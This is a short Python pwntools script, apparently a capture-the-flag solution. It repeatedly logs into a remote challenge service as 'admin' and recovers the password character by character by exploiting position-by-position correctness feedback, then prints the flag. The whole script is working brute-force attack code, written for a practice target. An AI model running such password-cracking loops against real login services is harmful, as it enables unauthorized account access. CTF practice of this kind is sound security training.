from pwn import *
import re

shell = remote("jh2i.com",50026)

pas = "abcdefghijklmnopqrstuvwxyz{}_"
guessed = [''] * 36

while True:
    try:
        shell.send('2')
        shell.send('admin')
        data = shell.recvuntilS(b"Password:")

        positions = re.findall(r"(\d+)",data)

        p1, p2, p3 = [(int(i)-1) for i in positions[-3:]]
        g1, g2, g3 = random.choice(pas), random.choice(pas), random.choice(pas)
        if guessed[p1]:
            g1 = guessed[p1]
        if guessed[p2]:
            g2 = guessed[p2]
        if guessed[p3]:
            g3 = guessed[p3]
        shell.send(f"{g1} {g2} {g3}")
        data = shell.recvuntilS(b">")
        
        positions = re.findall(r"(\d+) character: CORRECT", data)
        if positions:
            for p in positions:
                p = int(p) - 1
                if not guessed[p]:
                    if p == p1:
                        guessed[p] = g1
                    elif p == p2:
                        guessed[p] = g2
                    elif p == p3:
                        guessed[p] = g3
            password = ''.join(guessed)
            print(password)
            if '' not in guessed:
                print(f"flag is {password}")
                break
    except:
        print("Cracking Passsword ...")
        shell.close()
        shell = remote("jh2i.com",50026)
